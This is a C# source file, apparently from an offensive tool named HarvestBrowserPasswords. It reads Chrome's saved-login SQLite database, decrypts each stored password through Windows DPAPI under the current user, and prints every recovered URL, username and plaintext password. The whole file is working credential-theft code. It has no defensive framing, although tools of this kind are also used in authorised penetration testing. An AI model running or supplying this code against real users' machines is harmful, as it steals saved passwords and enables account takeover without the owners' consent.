using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Data.SQLite;
using System.Security.Cryptography;

namespace HarvestBrowserPasswords
{
    public class ChromeDatabaseDecryptor
    {
        public string filePath;
        public  ChromeDatabaseDecryptor(string databaseFilePath)
        {
            this.filePath = databaseFilePath;
            SQLiteConnection sqliteConnection = new SQLiteConnection(
                $"Data Source={filePath};" +
                $"Version=3;" +
                $"New=True");

            try
            {

                sqliteConnection.Open();
                SQLiteCommand sqliteCommand = sqliteConnection.CreateCommand();
                sqliteCommand.CommandText = "SELECT action_url, username_value, password_value FROM logins";
                SQLiteDataReader sqliteDataReader = sqliteCommand.ExecuteReader();

                //Iterate over each returned row from the query
                while (sqliteDataReader.Read())
                {
                    //Store columns as variables
                    string url = sqliteDataReader.GetString(0);
                    //Avoid Printing empty rows
                    if (url == "")
                    {
                        continue;
                    }

                    string username = sqliteDataReader.GetString(1);
                    byte[] password = (byte[])sqliteDataReader[2]; //Cast to byteArray for DPAPI decryption

                    try
                    {
                        //DPAPI Decrypt - Requires System.Security.dll and using System.Security.Cryptography
                        byte[] decryptedBytes = ProtectedData.Unprotect(password, null, DataProtectionScope.CurrentUser);
                        string decryptedAscii = Encoding.ASCII.GetString(decryptedBytes);
                        Console.WriteLine($"[+] Decrypted!");
                        Console.WriteLine($"\tURL:      {url}");
                        Console.WriteLine($"\tUsername: {username}");
                        Console.WriteLine($"\tPassword: {decryptedAscii}");
                    }
                    catch (Exception e)
                    {
                        Console.WriteLine($"[!] Error Decrypting Password: Exception {e}");
                    }
                }
    
            }
            catch (Exception e)
            {
                Console.WriteLine($"[!] Error connecting to database: {filePath}\nException: {e}");
            }

            sqliteConnection.Close();
        }
    }
}
